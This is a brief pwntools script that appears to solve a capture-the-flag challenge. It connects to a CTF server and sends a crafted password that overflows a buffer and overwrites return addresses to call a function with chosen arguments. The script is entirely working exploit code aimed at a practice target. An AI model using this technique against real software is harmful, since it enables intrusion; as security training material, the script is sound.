from pwn import *
r = remote('challenges.ctfd.io', 30027)

r.recvuntil('Enter your Name:')
r.sendline('hi')

r.recvuntil('Enter your password:')
r.sendline('B'*26 + p32(0xdeadbeef) + 'B'*12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0))

r.interactive()
